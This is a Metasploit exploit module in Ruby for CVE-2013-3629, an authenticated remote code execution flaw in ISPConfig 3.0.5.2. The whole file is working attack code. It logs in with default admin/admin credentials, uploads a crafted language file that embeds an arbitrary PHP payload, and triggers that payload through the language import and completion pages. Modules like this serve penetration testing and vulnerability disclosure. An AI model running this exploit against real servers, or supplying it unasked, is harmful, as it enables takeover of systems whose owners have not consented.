require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'ISPConfig Authenticated Arbitrary PHP Code Execution',
      'Description' => %q{
      ISPConfig allows an authenticated administrator to export language 
settings into a PHP script
      which is intended to be reuploaded later to restore language 
settings. This feature
      can be abused to run aribtrary PHP code remotely on the ISPConfig 
server.

      This module was tested against version 3.0.5.2.
      },
      'Author' =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / 
msf module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2013-3629'],
          ['URL', 
'https://community.rapid7.com/community/metasploit/blog/2013/10/30/seven-tricks-and-treats']
        ],
      'Privileged' => false,
      'Platform'	 => ['php'],
      'Arch'			 => ARCH_PHP,
      'Payload'		=>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'	=> 0,
      'DisclosureDate' => 'Oct 30 2013'))
      register_options(
      [
        OptString.new('TARGETURI', [ true, "Base ISPConfig directory 
path", '/']),
        OptString.new('USERNAME', [ true, "Username to authenticate 
with", 'admin']),
        OptString.new('PASSWORD', [ false, "Password to authenticate 
with", 'admin']),
        OptString.new('LANGUAGE', [ true, "The language to use to 
trigger the payload", 'es'])
      ], self.class)
  end

  def check
  end

  def lng
    datastore['LANGUAGE']
  end

  def exploit

    init = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '/index.php')
    })

    if !init or init.code != 200
      fail_with("Error getting initial page.")
    end

    sess = init.get_cookies

    post = {
      'username' => datastore["USERNAME"],
      'passwort' => datastore["PASSWORD"],
      's_mod' => 'login',
      's_pg' => 'index'
    }

    print_status("Authenticating as user: " << datastore["USERNAME"])

    login = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/content.php'),
      'vars_post' => post,
      'cookie' => sess
    })

    if !login or login.code != 200
      fail_with("Error authenticating.")
    end

    sess = login.get_cookies
    fname = rand_text_alphanumeric(rand(10)+6) + '.lng'
    php = "---|ISPConfig Language File|3.0.5.2|#{lng}\n"
    php << "--|global|#{lng}|#{lng}.lng\n"
    php << "<?php \n"
    php << payload.encoded
    php << "?>\n"
    php << "--|mail|#{lng}|#{lng}.lng\n"
    php << "<?php"
    php << "?>"

    data = Rex::MIME::Message.new
    data.add_part(php, 'application/x-php', nil, "form-data; 
name=\"file\"; filename=\"#{fname }\"")
    data.add_part('1', nil, nil, 'form-data; name="overwrite"')
    data.add_part('1', nil, nil, 'form-data; name="ignore_version"')
    data.add_part('', nil, nil, 'form-data; name="id"')

    data_post = data.to_s

    print_status("Sending payload")
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 
'/admin/language_import.php'),
      'ctype' => "multipart/form-data; boundary=#{data.bound}",
      'data' => data_post,
      'cookie' => sess
    })

    post = {
      'lng_select' => 'es'
    }

    print_status("Triggering payload...")
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 
'/admin/language_complete.php'),
      'vars_post' => post,
      'cookie' => sess
    })
  end
end
